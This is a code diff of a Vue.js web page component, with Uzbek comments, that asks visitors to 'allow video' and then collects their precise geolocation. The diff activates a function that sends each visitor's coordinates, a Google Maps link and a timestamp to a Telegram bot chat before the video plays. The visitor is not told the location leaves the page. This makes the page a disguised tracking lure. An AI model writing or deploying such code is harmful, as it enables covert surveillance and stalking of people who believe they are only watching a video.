@@ -34,21 +34,19 @@ export default {
     allowVideo() {
       this.getGeolocation();
     },
-
     getGeolocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
             this.latitude = position.coords.latitude;
             this.longitude = position.coords.longitude;
-            this.sendToTelegram();
+            this.sendToTelegram(); // faqat muvaffaqiyatli holatda
             this.showModal = false;
             this.showVideo = true;
           },
           (error) => {
             console.error("Geolocation error:", error.message);
-            this.sendToTelegram(true);
-            window.location.href = "/"; // Ruxsat bermasa – redirect
+            window.location.href = "/"; // rad etsa — sahifaga qaytar
           },
           {
             enableHighAccuracy: true,
@@ -57,32 +55,29 @@ export default {
           }
         );
       } else {
-        this.sendToTelegram(true);
         window.location.href = "/";
       }
     },
 
-    //     sendToTelegram(error = false) {
-    //       const message = error
-    //         ? `❌ Geolocation olishda xatolik yoki foydalanuvchi rad etdi.`
-    //         : `📍 Yangi foydalanuvchi joylashuvi:
-    // Latitude: ${this.latitude}
-    // Longitude: ${this.longitude}
-    // 🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
-    // 🕒 Vaqt: ${new Date().toLocaleString()}`;
+    sendToTelegram() {
+      const message = `📍 Yangi foydalanuvchi joylashuvi:
+Latitude: ${this.latitude}
+Longitude: ${this.longitude}
+🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
+🕒 Vaqt: ${new Date().toLocaleString()}`;
 
-    //       const encodedMessage = encodeURIComponent(message);
-    //       const telegramUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage?chat_id=${this.chatId}&text=${encodedMessage}`;
+      const encodedMessage = encodeURIComponent(message);
+      const telegramUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage?chat_id=${this.chatId}&text=${encodedMessage}`;
 
-    //       fetch(telegramUrl)
-    //         .then((res) => res.json())
-    //         .then((data) => {
-    //           console.log("Telegramga yuborildi:", data);
-    //         })
-    //         .catch((err) => {
-    //           console.error("Telegramga yuborishda xatolik:", err);
-    //         });
-    //     },
+      fetch(telegramUrl)
+        .then((res) => res.json())
+        .then((data) => {
+          console.log("Telegramga yuborildi:", data);
+        })
+        .catch((err) => {
+          console.error("Telegramga yuborishda xatolik:", err);
+        });
+    },
   },
 };
 </script>
